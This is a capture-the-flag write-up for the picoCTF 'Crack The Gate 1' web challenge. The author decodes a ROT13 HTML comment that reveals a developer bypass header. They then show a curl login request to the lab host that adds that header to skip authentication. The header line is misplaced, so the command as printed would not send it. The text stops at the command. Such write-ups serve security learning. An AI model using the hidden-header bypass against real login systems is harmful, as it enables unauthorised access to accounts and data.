# Crack The Gate 1 - picoMini by CMU-Africa

------

## Introduction
Crack The Gate 1 is a Web Exploitation task. The goal is to analyze the login portal for vulnerabilites and find a way to bypass the authentication mechanism as `ctf-player@picoctf.org` to retrieve the sensitive data hidden inside.

Challenge description:

> We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out? The website is running here. Can you try to log in?

------

## My approach to finding the flag

1. Firstly, I connected to the website to see what I am dealing with.
[!img1](./img/ctg1.png)

2. I typed random characters in the password field and hit login. The page replied with "Invalid credentials". So, I thought maybe there was something to find in the page's HTML source code. After scrolling for a little bit and inspecting the HTML, I've noticed a weird comment, some scrambled letters, the comment looked like some kind of obfuscation was applied to them, so I thought maybe ROT13 would help me. I decoded the scrambled text and came across this `NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes`.
[!error](./img/ctg2.png)
[!source-code](./img/ctg3.png)
[!decoded](./img/ctg4.png)

3. Next thing I thought to try was to reproduce the bypass without relying on the browser, as they are blocking a lot of costum headers beacuse of CORS, so I used `curl` in the Linux terminal. First I had to go trough a few steps:
        1. Right click on the page
        2. Click inspect
        3. Click on Network
        4. Click the login button to get a `POST` request
        5. Right click on the request and copy it as a cURL

4. After getting the cURL, I pasted it in the terminal and added -H 'X-Dev-Access: yes' \

```bash
curl 'http://amiable-citadel.picoctf.net:58946/login' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://amiable-citadel.picoctf.net:58946/' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://amiable-citadel.picoctf.net:58946' \
  -H 'Connection: keep-alive' \
  -H 'Priority: u=0' \
  --data-raw '{"email":"ctf-player@picoctf.org","password":"dadad"}'
  -H 'X-Dev-Access: yes' \
